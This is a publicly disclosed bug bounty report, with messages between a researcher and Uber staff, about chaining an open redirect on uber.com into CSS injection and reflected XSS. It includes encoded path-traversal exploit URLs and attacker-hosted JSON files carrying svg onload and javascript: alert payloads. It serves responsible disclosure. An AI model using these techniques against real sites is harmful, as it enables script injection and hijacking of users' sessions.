title: Reflected XSS via Unvalidated / Open Redirect in uber.com

summaries.content:
This report demonstrate as much usual Open Redirect can be dangerous.
### Open Redirect
Open Redirect was reproduced from this URL: [uber.com/en//example.com/](https://www.uber.com/en//example.com/)
Response:
{F81107}
### CSS injection
This vulnerability was reproduced via parameter `theme` from URL [uber.com/?theme=../en//example.com/css-code.css%23](https://www.uber.com/?theme=../en//example.com/css-code.css%23) as follow:
```
<link rel="stylesheet" id="theme-css" href="https://uber.com/stylesheets/../en//example.com/css-code.css#.css">
```
Browser try to load CSS code from: [example.com/css-code.css](https://example.com/css-code.css)
To fix @uber added whitelisting the theme names.
### Reflected Cross-Site Scripting
This vulnerability was produced via insufficient filtration API requests.
>Example URL to controlling API request: [uber.com/careers/list/-CONTROLLED-/](https://www.uber.com/careers/list/-CONTROLLED-/)
Browser try to load JSON content from: [uber.com/api/jobs/-CONTROLLED-](https://www.uber.com/api/jobs/-CONTROLLED-)
>
Sending API requests to another domain: [uber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/](https://www.uber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/)
Browser try to load JSON content from: 
[uber.com/en//example.com/file.json](https://uber.com/en//example.com/file.json) >>> [example.com/file.json](https://example.com/file.json)

So, on controlled me domain I placed JSON file with this content:
```
{  
   "id":"9999",
   "title":"XSS on Uber.com",
   "overview":"<svg onload=\"alert('XSS on '+ document.domain)\">",
   "responsibilities":null,
   "qualifications":null,
   "lastUpdated":"2016-01-16 06:29 AM",
   "formattedTeam":"xss",
   "team":"xss",
   "subTeam":"xss",
   "formattedLocation":"xss",
   "slugs":{  
      "team":"xss",
      "subTeam":"xss",
      "city":"xss",
      "country":"xss"
   },
   "city":"xss",
   "country":"xss",
   "jobUrl":"javascript:alert('XSS on '+ document.domain)",
   "normalizedTitle":"xss",
   "normalizedContent":"xss"
}
```
and get unusually high degree of control over the page.
Then I found a similar XSS vector on [uber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/](https://www.uber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/).
Browser try to load JSON content from: [example.com/file.json](https://example.com/file.json)
Vulnerable JSON  for [uber.com/cities/-CONTROLLED-/](https://www.uber.com/cities/-CONTROLLED-/):
```
{  
   "products":[  
      {  
         "productDisplayType":"uberx",
         "fare":{  
            "safeRideFee":"USD9999.99",
            "perMinute":"USD9999.99",
            "minimum":"USD9999.99",
            "cancellation":"USD9999.99",
            "fareType":"time_plus_distance",
            "base":"USD9999.99",
            "isDistanceUnitMetric":false,
            "perDistanceUnit":"USD9999.99",
            "additionalFees":[  

            ]
         },
         "displayName":"uberX",
         "tagline":"XSS",
         "taxiFareInfo":false,
         "finePrint":[  
            "XSS"
         ]
      },
      {  
         "productDisplayType":"uberxl",
         "fare":{  
            "safeRideFee":"USD9999.99",
            "perMinute":"USD9999.99",
            "minimum":"USD9999.99",
            "cancellation":"USD9999.99",
            "fareType":"time_plus_distance",
            "base":"USD9999.99",
            "isDistanceUnitMetric":false,
            "perDistanceUnit":"USD9999.99",
            "additionalFees":[  

            ]
         },
         "displayName":"uberXL",
         "tagline":"XSS",
         "taxiFareInfo":false,
         "finePrint":[  
            "XSS"
         ]
      }
   ],
   "flatRates":[  

   ],
   "id":9999,
   "cityId":9999,
   "flatRateDisplayNames":[  

   ],
   "geoJson":null,
   "geoPoint":{  
      "latitude":33.951252,
      "longitude":-83.382943
   },
   "slug":"xss",
   "twitterHandle":null,
   "theme":{  
      "name":"united_states",
      "ctaColor":"#57AD57",
      "patternColor":"#4DB5D9",
      "patternColorBackground":"#A6DAEC"
   },
   "rideContent":"XSS",
   "driveContent":"XSS",
   "impactContent":"XSS",
   "name":"<marquee>XSS</marquee><svg onload=\"alert('XSS on '+ document.domain)\">",
   "pageTitle":"XSS",
   "pageDescription":"XSS",
   "productLegalNotice":null,
   "pageConfiguration":{  

   }
}
```
summaries.content_html:
This report demonstrate as much usual Open Redirect can be dangerous.

Open Redirect

Open Redirect was reproduced from this URL: uber.com/en//example.com/
Response:

CSS injection

This vulnerability was reproduced via parameter theme from URL uber.com/?theme=../en//example.com/css-code.css%23 as follow:

<link rel="stylesheet" id="theme-css" href="https://uber.com/stylesheets/../en//example.com/css-code.css#.css">

Browser try to load CSS code from: example.com/css-code.css
To fix @uber added whitelisting the theme names.

Reflected Cross-Site Scripting

This vulnerability was produced via insufficient filtration API requests.

Example URL to controlling API request: uber.com/careers/list/-CONTROLLED-/
Browser try to load JSON content from: uber.com/api/jobs/-CONTROLLED-

Sending API requests to another domain: uber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/
Browser try to load JSON content from:
uber.com/en//example.com/file.json >>> example.com/file.json

So, on controlled me domain I placed JSON file with this content:

{  
   "id":"9999",
   "title":"XSS on Uber.com",
   "overview":"<svg onload=\"alert('XSS on '+ document.domain)\">",
   "responsibilities":null,
   "qualifications":null,
   "lastUpdated":"2016-01-16 06:29 AM",

   "normalizedContent":"xss"
}

and get unusually high degree of control over the page.
Then I found a similar XSS vector on uber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/.
Browser try to load JSON content from: example.com/file.json
Vulnerable JSON for uber.com/cities/-CONTROLLED-/:

{

   "geoPoint":{

   },

activities.message: Thanks for the report! I've sent it off to the team involved to look into further. We will keep you updated.
activities.markdown_message: Thanks for the report! I've sent it off to the team involved to look into further. We will keep you updated.

activities.message: Using this Open Redirect I can make [CSS Injection (XSS)](http://blog.innerht.ml/cascading-style-scripting/ "CSS Injection"). Here is described this issue #125964.
activities.markdown_message: Using this Open Redirect I can make CSS Injection (XSS). Here is described this issue #125964.

activities.message:
Hello, using this Open Redirect I can send AJAX request to another resource, and make Cross-Site Scripting.
Vulnerable URL: https://www.uber.com/careers/list/..%2f..%2fen%2f%2fcdn.shopify.com%2fs%2ffiles%2f1%2f1223%2f5942%2ffiles%2fx.json/
Will be uploaded content from this JSON file: https://cdn.shopify.com/s/files/1/1223/5942/files/x.json
```
{"id":"9999","title":"XSS on Uber.com","overview":"<svg onload=\"alert('XSS on '+ document.domain)\">","responsibilities":null,"qualifications":null,"lastUpdated":"2016-01-16 06:29 AM","formattedTeam":"xss","team":"xss","subTeam":"xss","formattedLocation":"xss","slugs":{"team":"xss","subTeam":"xss","city":"xss","country":"xss"},"city":"xss","country":"xss","jobUrl":"javascript:alert('XSS on '+ document.domain)","normalizedTitle":"xss","normalizedContent":"xss"}
```
For XSS i used this payload: `<svg onload="alert('XSS on '+ document.domain)">`
Cross-Site Scripting work in all browsers.

Will be uploaded content from this JSON file: https://cdn.shopify.com/s/files/1/1223/5942/files/x.json

For XSS i used this payload: <svg onload="alert('XSS on '+ document.domain)">

activities.message: Cross-Site Scripting is not produced. Very fast fix.
activities.markdown_message: Cross-Site Scripting is not produced. Very fast fix.

activities.message:
I found a similar XSS vector.
Vulnerable URL: https://www.uber.com/es/cities/..%2f..%2fen%2f%2fcdn.shopify.com%2fs%2ffiles%2f1%2f1223%2f5942%2ffiles%2fc.json/
Will be uploaded content from this JSON file: https://cdn.shopify.com/s/files/1/1223/5942/files/c.json
```
{"products":[{"productDisplayType":"uberx","fare":{"safeRideFee":"USD9999.99","perMinute":"USD9999.99","minimum":"USD9999.99","cancellation":"USD9999.99","fareType":"time_plus_distance","base":"USD9999.99","isDistanceUnitMetric":false,"perDistanceUnit":"USD9999.99","additionalFees":[]},"displayName":"uberX","tagline":"XSS","taxiFareInfo":false,"finePrint":["XSS"]},{"productDisplayType":"uberxl","fare":{"safeRideFee":"USD9999.99","perMinute":"USD9999.99","minimum":"USD9999.99","cancellation":"USD9999.99","fareType":"time_plus_distance","base":"USD9999.99","isDistanceUnitMetric":false,"perDistanceUnit":"USD9999.99","additionalFees":[]},"displayName":"uberXL","tagline":"XSS","taxiFareInfo":false,"finePrint":["XSS"]}],"flatRates":[],"id":9999,"cityId":9999,"flatRateDisplayNames":[],"geoJson":null,"geoPoint":{"latitude":33.951252,"longitude":-83.382943},"slug":"xss","twitterHandle":null,"theme":{"name":"united_states","ctaColor":"#57AD57","patternColor":"#4DB5D9","patternColorBackground":"#A6DAEC"},"rideContent":"XSS","driveContent":"XSS","impactContent":"XSS","name":"<marquee>XSS</marquee><svg onload=\"alert('XSS on '+ document.domain)\">","pageTitle":"XSS","pageDescription":"XSS","productLegalNotice":null,"pageConfiguration":{}}
```
Work in all browsers.

activities.message: Hello @mdv! We believe the XSS vector has been mitigated. Can you test again and confirm the fix? We are still in the process of rolling out the fix for the open redirect. Thanks!
activities.markdown_message: Hello @mdv! We believe the XSS vector has been mitigated. Can you test again and confirm the fix? We are still in the process of rolling out the fix for the open redirect. Thanks!

activities.message:
@zacmuber I don't believe the XSS fix has been deployed yet as the XSS still repros, but a fix for both the open redirect and the XSS has been committed. 

@mdv The fix will probably be live tomorrow, I'll update this report once it's out.
activities.markdown_message:
@zacmuber I don't believe the XSS fix has been deployed yet as the XSS still repros, but a fix for both the open redirect and the XSS has been committed.

@mdv The fix will probably be live tomorrow, I'll update this report once it's out.

activities.message:
@zacmuber @jmilne-uber
Thanks for info! XSS is not fixed.
activities.markdown_message:
@zacmuber @jmilne-uber
Thanks for info! XSS is not fixed.

activities.message:
I read

>Open redirects - 99% of open redirect issues have low security impact. For the rare cases, like stealing oauth tokens, we do still want to hear about them

In fact, XSS vulnerabilities is the main danger, and Open Redirect refers to the 99% who have low security impact. This Open Redirect is still valid?
activities.markdown_message:
I read

Open redirects - 99% of open redirect issues have low security impact. For the rare cases, like stealing oauth tokens, we do still want to hear about them

In fact, XSS vulnerabilities is the main danger, and Open Redirect refers to the 99% who have low security impact. This Open Redirect is still valid?

activities.message:
Hey @mdv,

We honor what was in scope at the time of report submission, so we would still consider it valid. Further, you were able to work it into a reflected XSS and a content spoofing vuln that gave you an unusually high degree of control over the page, so we would consider this valid even now.

We've just pushed a fix that should resolve the open redirect, can you verify that this is fixed? Note that we were sending 301 redirects with long `max-age`s so your old test URLs might still be cached in your browser.

Cheers,
Jordan
activities.markdown_message:
Hey @mdv,

We honor what was in scope at the time of report submission, so we would still consider it valid. Further, you were able to work it into a reflected XSS and a content spoofing vuln that gave you an unusually high degree of control over the page, so we would consider this valid even now.

We've just pushed a fix that should resolve the open redirect, can you verify that this is fixed? Note that we were sending 301 redirects with long max-ages so your old test URLs might still be cached in your browser.

Cheers,
Jordan

activities.message: I verify, Open Redirect is fixed.
activities.markdown_message: I verify, Open Redirect is fixed.

activities.message:
But I can still control the sending AJAX requests so: https://www.uber.com/cities/%252e%252e%2f%252e%252e%2fexample_page/
Page try uploading a content from this page: https://www.uber.com/example_page That is risk of running into the same problem over and over again.

activities.message: Yep, we have an open task for fixing that as well.
activities.markdown_message: Yep, we have an open task for fixing that as well.

activities.message: Awesome, I'm going to make this as resolved then. Thanks again for the report!
activities.markdown_message: Awesome, I'm going to make this as resolved then. Thanks again for the report!

activities.message: Great! Thanks.
activities.markdown_message: Great! Thanks.

additional_data.new_title: Reflected XSS via Unvalidated / Open Redirect in uber.com

activities.message: If you think that this issue must stay private - not a problem.
activities.markdown_message: If you think that this issue must stay private - not a problem.

activities.message:
Hi @mdv!

Based on the issues we were able to fix thanks to your report, we've decided to award you $3000!

This is a particularly interesting way of abusing an open redirect, very clever! Note that someone else had reported the first open redirect -> XSS chain you mentioned, but your second chain was indeed novel. The "XSS" marquee in your stylesheet injection PoC was also a nice touch.

Thank you again for your report, I hope to see more reports from you in the future!
activities.markdown_message:
Hi @mdv!

Based on the issues we were able to fix thanks to your report, we've decided to award you $3000!

This is a particularly interesting way of abusing an open redirect, very clever! Note that someone else had reported the first open redirect -> XSS chain you mentioned, but your second chain was indeed novel. The "XSS" marquee in your stylesheet injection PoC was also a nice touch.

Thank you again for your report, I hope to see more reports from you in the future!

activities.message: Thanks! You agree to disclose this report publicly?
activities.markdown_message: Thanks! You agree to disclose this report publicly?

activities.message:
We're holding a meeting soonish to review reports marked pending disclosure, but we'd like to get a mitigation in that endpoint that enabled XSS via open redirect before we disclose.

Cheers,
Jordan
activities.markdown_message:
We're holding a meeting soonish to review reports marked pending disclosure, but we'd like to get a mitigation in that endpoint that enabled XSS via open redirect before we disclose.

Cheers,
Jordan

activities.message: Ok, thanks again.
activities.markdown_message: Ok, thanks again.

activities.message: Hey @mdv, publicly disclosing this now - thanks for the report!
activities.markdown_message: Hey @mdv, publicly disclosing this now - thanks for the report!

vulnerability_information_html:
Hello,
To reproduce this issue, visit this URL: https://www.uber.com/en//example.com/
This URL will redirect at example.com.
vulnerability_information:
Hello,
To reproduce this issue, visit this URL: https://www.uber.com/en//example.com/
This URL will redirect at [example.com](https://example.com/).
